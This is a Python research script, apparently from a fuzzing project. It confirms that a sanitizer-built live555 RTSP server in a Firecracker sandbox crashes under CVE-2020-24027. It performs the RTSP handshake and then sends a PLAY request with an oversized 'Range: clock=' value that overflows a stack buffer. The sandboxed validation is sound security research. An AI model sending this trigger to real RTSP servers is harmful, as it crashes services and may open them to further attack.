#!/usr/bin/env python3
"""
live555_cve_2020_24027_probe.py
────────────────────────────────
POSITIVE-CONTROL DIAGNOSTIC (NOT a fuzzer seed, NOT a discovery claim).

Purpose: empirically confirm that the already-built live555 rootfs
(``rootfs_live555.ext4`` @ commit ceeb4f4) is exploitable by CVE-2020-24027,
so we know the fuzz target is genuinely vulnerable before investing in
fuzzer reachability work. Source-level confirmation is already done
(``RTSPServer.cpp``@ceeb4f4 has ``sprintf(buf[100], "Range: clock=%s-%s",
absStart, absEnd)`` in ``handleCmd_PLAY``); this script confirms the BUILT
binary actually crashes under the trigger.

CVE-2020-24027: stack BOF in ``RTSPServer::RTSPClientSession::handleCmd_PLAY``.
A PLAY request whose ``Range: clock=<long>`` absolute-time start value exceeds
~90 chars overflows ``char buf[100]``. Built with ASAN + abort_on_error → the
overflow aborts PID1 → guest kernel panics → Firecracker VM exits.

This is a deliberate, hand-crafted trigger — it is the OPPOSITE of what the
fuzzer must do autonomously. It only validates exploitability. The honest RQ3
claim (if the fuzzer later reaches this) is "positive control: the pipeline
confirmed a known CVE", not "discovery".

Usage:
    python3 scripts/live555_cve_2020_24027_probe.py
"""
from __future__ import annotations

import asyncio
import sys
import time
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parent.parent
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from sandbox.firecracker_driver import FirecrackerSandbox  # noqa: E402

VM_IP = "172.16.0.2"
RTSP_PORT = 8554
# testOnDemandRTSPServer registers streams by NAME, and file-based streams
# (matroskaFileTest, h264ESVideoTest, ...) only register if their media file
# exists at startup. The rootfs ships NO media files, so those 404. The one
# stream registered WITHOUT a file is the UDP-source transport stream — use
# it so SETUP creates a real session and PLAY reaches handleCmd_PLAY (where
# CVE-2020-24027 overflows, in the response-building, before any streaming).
STREAM = "mpeg2TransportStreamFromUDPSourceTest"
URL = f"rtsp://{VM_IP}:{RTSP_PORT}/{STREAM}"
CRLF = "\r\n"

# CVE-2020-24027 trigger: a Range: clock= start value far longer than buf[100].
# 200 chars guarantees the sprintf overflow regardless of exact prefix math.
CLOCK_OVERFLOW = "0" * 200


def rtsp_request(method: str, url: str, headers: dict[str, str], cseq: int) -> bytes:
    lines = [f"{method} {url} RTSP/1.0{CRLF}", f"CSeq: {cseq}{CRLF}"]
    for k, v in headers.items():
        lines.append(f"{k}: {v}{CRLF}")
    lines.append(CRLF)
    return "".join(lines).encode("ascii")


async def send_recv(sock: tuple, pkt: bytes, timeout: float = 3.0) -> bytes:
    """Send + recv on an EXISTING connection (RTSP session is connection-bound
    for testOnDemandRTSPServer — the whole handshake must share one socket)."""
    reader, writer = sock
    writer.write(pkt)
    await writer.drain()
    try:
        resp = await asyncio.wait_for(reader.read(4096), timeout=timeout)
    except (ConnectionResetError, asyncio.TimeoutError, BrokenPipeError, OSError):
        return b""
    return resp


def session_id(resp: bytes) -> str:
    for line in resp.decode("ascii", errors="replace").split(CRLF):
        if line.lower().startswith("session:"):
            return line.split(":", 1)[1].strip().split(";")[0]
    return ""


async def main() -> int:
    print("=" * 61)
    print("  CVE-2020-24027 POSITIVE-CONTROL PROBE (live555 @ ceeb4f4)")
    print("  Hand-crafted trigger — validates BUILD exploitability only.")
    print("=" * 61)

    sandbox = FirecrackerSandbox(
        rootfs_path="sandbox/firecracker_env/rootfs_live555.ext4",
        kernel_args=(
            "console=ttyS0 reboot=k panic=1 pci=off"
            " root=/dev/vda rw init=/init"
            " ip=172.16.0.2::172.16.0.1:255.255.255.0::eth0:off"
        ),
        target_name="live555",
        target_port=RTSP_PORT,
        socket_path="/tmp/firecracker-live555-probe.sock",
        tap_name="tap-lifa-probe0",
    )

    try:
        print("\n[1/5] Booting live555 MicroVM …")
        t0 = time.perf_counter()
        await sandbox.start()
        print(f"      booted in {time.perf_counter()-t0:.1f}s; waiting for RTSP port…")
        # testOnDemandRTSPServer needs a moment to bind
        for _ in range(40):
            try:
                r, w = await asyncio.wait_for(
                    asyncio.open_connection(VM_IP, RTSP_PORT), timeout=0.5
                )
                w.close()
                await w.wait_closed()
                break
            except (ConnectionRefusedError, asyncio.TimeoutError, OSError):
                await asyncio.sleep(0.5)
        else:
            print("      !! RTSP port never opened")
            return 2

        print("\n[2/5] RTSP handshake (OPTIONS → DESCRIBE → SETUP) …")
        sock = await asyncio.wait_for(
            asyncio.open_connection(VM_IP, RTSP_PORT), timeout=5.0
        )
        await send_recv(sock, rtsp_request("OPTIONS", URL, {}, 1))
        await send_recv(sock, rtsp_request("DESCRIBE", URL,
                                           {"Accept": "application/sdp"}, 2))
        setup_resp = await send_recv(
            sock,
            rtsp_request("SETUP", URL + "/track1",
                         {"Transport": "RTP/AVP;unicast;client_port=50000-50001"}, 3),
        )
        sess = session_id(setup_resp)
        print(f"      SETUP status: {setup_resp.split(CRLF.encode())[0]!r}")
        print(f"      Session: {sess or '<none — SETUP failed>'}")
        if not sess:
            print("      !! no Session id — cannot send a well-formed PLAY")
            sock[1].close()
            return 3

        print("\n[3/5] Sending PLAY with oversized Range: clock= (CVE-2020-24027) …")
        play = rtsp_request(
            "PLAY", URL,
            {"Session": sess, "Range": f"clock={CLOCK_OVERFLOW}-0.01"}, 4,
        )
        try:
            r = await send_recv(sock, play, timeout=3.0)
            print(f"      PLAY response: {r.split(CRLF.encode())[0]!r}" if r
                  else "      (no response — server may have crashed)")
        except (ConnectionResetError, asyncio.TimeoutError, BrokenPipeError, OSError):
            print("      (connection reset/timeout — consistent with a crash)")
        try:
            sock[1].close()
        except Exception:
            pass

        print("\n[4/5] Checking target liveness …")
        await asyncio.sleep(0.8)
        alive = await sandbox.is_target_alive()
        print(f"      is_target_alive() = {alive}")

        print("\n[5/5] Serial console (ASAN marker?) …")
        serial = sandbox.get_serial_output() or ""
        # Show the tail; look for ASAN / overflow markers.
        tail = serial[-1500:] if len(serial) > 1500 else serial
        print(tail.rstrip())
        asan = any(
            m in serial.lower()
            for m in ("addresssanitizer", "stack-buffer-overflow", "summaries",
                      "handlecmd_play", "abort_on_error")
        )
        print("\n" + "=" * 61)
        if (not alive) and asan:
            print("  RESULT: ✓ ASAN stack-buffer-overflow triggered (CVE-2020-24027)")
            print("          → rootfs@ceeb4f4 is exploitable; no rebuild needed.")
            rc = 0
        elif not alive:
            print("  RESULT: ~ target died, but no ASAN marker seen in serial tail")
            print("          (may still be the overflow — check full serial).")
            rc = 0
        else:
            print("  RESULT: ✗ target still alive — CVE-2020-24027 did NOT trigger.")
            print("          → fall back: pin the 20200625 tarball, rebuild, re-probe.")
            rc = 1
        print("=" * 61)
        return rc

    finally:
        try:
            await sandbox.stop()
        except Exception:
            pass


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))
